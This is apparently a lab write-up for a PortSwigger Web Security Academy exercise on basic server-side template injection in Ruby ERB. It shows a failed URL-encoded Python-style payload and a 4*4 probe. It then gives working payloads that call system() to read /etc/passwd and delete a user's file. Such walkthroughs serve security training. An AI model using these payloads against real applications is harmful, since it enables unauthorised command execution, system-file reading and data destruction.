# Basic Server-Side Template Injection

This lab is exploitable through server-side template injection because of how an ERB template is built unsafely.

**Goal:** Consult the ERB documentation to figure out how to run arbitrary code, then use that to delete `morale.txt` from Carlos's home directory.

---

**References:**
- https://portswigger.net/web-security/server-side-template-injection/exploiting
- https://www.trustedsec.com/blog/rubyerb-template-injection/
- https://twitter.com/harshbothra_/status/1498324305872318464?lang=en

pic 1

---

The initial post triggers an error:

pic 2

This happens via a GET request that controls the message displayed:

pic 3

I tried sending the URL-encoded form of this example payload:

```
<%
                import os
                x=os.popen('id').read()
                %>
                ${x}
```

```
GET /?message=%3c%25%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%6d%70%6f%72%74%20%6f%73%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%78%3d%6f%73%2e%70%6f%70%65%6e%28%27%69%64%27%29%2e%72%65%61%64%28%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%25%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%7b%78%7d
```

This produced the following error:

pic 4

The TrustedSec blog post on Ruby ERB template injection (https://www.trustedsec.com/blog/rubyerb-template-injection/) has relevant details:

```
GET /?message=<%=+4*4+%>
```

pic 5

Arbitrary command execution turns out to be achievable with a payload like this:

```
GET /?message=<%=+system('cat+/etc/passwd')+%>

GET /?message=<%=+system('rm+/home/carlos/morale.txt')+%>
```

pic 6
pic 7
